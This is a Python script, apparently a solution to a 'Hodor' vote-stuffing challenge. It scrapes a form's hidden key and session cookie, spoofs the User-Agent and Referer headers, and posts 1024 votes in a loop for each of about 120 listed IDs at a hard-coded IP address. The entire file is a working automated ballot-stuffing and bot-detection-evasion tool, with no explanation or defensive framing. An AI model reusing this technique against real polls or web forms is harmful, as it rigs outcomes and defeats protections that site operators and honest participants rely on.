#!/usr/bin/python3
"""
Voting as a Windows user
"""


import requests
from lxml import html

def update_id(payload, i):
    payload["id"] = str(i)

def update_cookie_and_payload(res, cookie, payload):
    """
    Updates the cookie and payload as each vote gets cast
    """
    cookie["HoldTheDoor"] = res.cookies["HoldTheDoor"]
    tree = html.fromstring(res.text)
    key = str(tree.xpath('//input[@name="key"]/@value')[0])
    payload["key"] = key

def get_initial_data(url, cookie, payload):
    """
    Retrieves the initial cookie and payload
    """
    res = requests.get(url)
    update_cookie_and_payload(res, cookie, payload)

def cast_vote(url, cookie, payload):
    """
    Casts a vote as if you were on Windows
    """
    user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36"
    header = {
        "Referer": url,
        "User-Agent": user_agent
    }
    res = requests.post(url, data=payload, cookies=cookie, headers=header)
    return res

hodor_cookie = {}
hodor_payload = {
    "holdthedoor": "Submit Query"
}
endpoint = "http://158.69.76.135/level2.php"
student_ids = [13,
               14,
               16,
               17,
               18,
               20,
               21,
               22,
               23,
               24,
               27,
               28,
               29,
               30,
               33,
               34,
               35,
               36,
               37,
               38,
               39,
               40,
               41,
               43,
               44,
               45,
               46,
               49,
               59,
               60,
               61,
               62,
               65,
               66,
               67,
               70,
               73,
               77,
               79,
               80,
               81,
               82,
               90,
               91,
               92,
               93,
               95,
               96,
               100,
               102,
               108,
               110,
               112,
               113,
               115,
               116,
               117,
               118,
               119,
               120,
               121,
               122,
               123,
               124,
               126,
               127,
               128,
               129,
               130,
               131,
               132,
               133,
               135,
               136,
               137,
               139,
               144,
               147,
               149,
               151,
               154,
               156,
               189,
               205,
               206,
               209,
               210,
               211,
               214,
               215,
               217,
               222,
               223,
               224,
               225,
               228,
               229,
               231,
               232,
               233,
               234,
               235,
               236,
               237,
               238,
               239,
               242,
               244,
               245,
               246,
               247,
               248,
               250,
               251,
               252,
               253,
               256,
               257,
               258,
               259,
               260,
               261,
               262,
               263,
               264]

get_initial_data(endpoint, hodor_cookie, hodor_payload)

for i in student_ids[7:]:
    update_id(hodor_payload, i)
    for i in range(1024):
        res = cast_vote(endpoint, hodor_cookie, hodor_payload)
        print("Vote #{:d} casted".format(i))
        update_cookie_and_payload(res, hodor_cookie, hodor_payload)
